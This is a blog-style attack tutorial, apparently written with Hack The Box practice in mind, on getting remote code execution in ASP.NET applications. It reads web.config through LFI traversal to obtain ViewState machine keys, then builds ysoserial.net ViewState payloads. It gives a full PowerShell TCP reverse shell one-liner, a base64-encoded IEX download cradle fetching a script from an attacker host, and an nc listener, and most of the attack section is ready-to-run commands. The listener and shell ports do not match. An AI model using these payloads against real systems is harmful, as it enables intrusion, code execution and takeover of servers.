---
title: "Shell in Dotnet Applications"
date: 2025-11-03 00:00:00 +0800
categories: [AD- Attacks]
tags: [Shells in Dotnet Applications]
platform: AD- Attacks
author: 0xmr
image: /assets/img/posts/dotnet.jpeg
excerpt: "Technical understanding and practical overview"
---

# Reverse Shells in .NET Applications

.NET is commonly used for Windows-compatible web applications (e.g., `.aspx` pages).

> **Important:** If you're new to this attack flow, spin up a practice machine (for example, a Pov / HTB box) and learn hands-on using Hack The Box (HTB).

## Locate the `web.config` file via LFI
If you find a Local File Inclusion (LFI) vulnerability, you can often read `web.config`:

```bash
../../web.config
..././web.config    # directory traversal / directory skipping techniques may be required

###  Read know
if you get this `web.config` file, know it's time to extract some important info from there.
# We Need this Info:-
   --validationalg=
   --validationkey=
   --decryptionalg=
   --decryptionkey=
```
### Generate a Ysoserial Payload
we need windows to Generate this payload.Git clone this tool in windwos and run it. [Tool Here](https://github.com/pwntester/ysoserial.net/releases)
```bash
#this payload run the whoami command only !
.\ysoserial.exe -p ViewState -g TextFormattingRunProperties --path="/Home/Download" --apppath="/"  --decryptionalg="AES"  --decryptionkey="xyz" --validationkey="xyz" --validationalg="HMACSHA256" -c "whoami"
```
## Create a 0xmr.ps1 file
Change the ip address here
```bash
$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
# Create a cradle
```bash
# Create the cradle file (example using nano)
nano cradle

# Inside cradle, place the following one-liner to download and execute the script:
IEX (New-Object Net.WebClient).DownloadString('http://attacker_ip:8000/0xmr.ps1')

# Convert to UTF-16LE and base64 so you can embed it where needed:
cat cradle | iconv -t utf-16le | base64 -w0; echo

# Serve the script via a simple HTTP server
python3 -m http.server 8000
```
## Generate a Reverse Shell
Replace the `path` and `<encoded code here>` with your Base64-encoded cradle or an encoded PowerShell command.
```bash
.\ysoserial.exe -p ViewState -g TextFormattingRunProperties --path="/Home/Download" --apppath="/"  --decryptionalg="AES"  --decryptionkey="xyz" --validationkey="xyz" --validationalg="HMACSHA256" -c "powershell -enc <encoded code here>" #paste that payload here
```
## Start a listner
```bash
rlwrap nc -lvnp 9001
```

# Injection and exploitation notes

You must identify which parameter accepts the ViewState (or another serialized/deserialized parameter). Commonly this is `__VIEWSTATE`, but it may vary. Steps:
1. Capture requests and responses to identify where the application reads serialized input.
2. Inject the generated payload into that parameter and observe the server behavior.
3. If successful, you will get remote code execution and a reverse shell back to your listener.
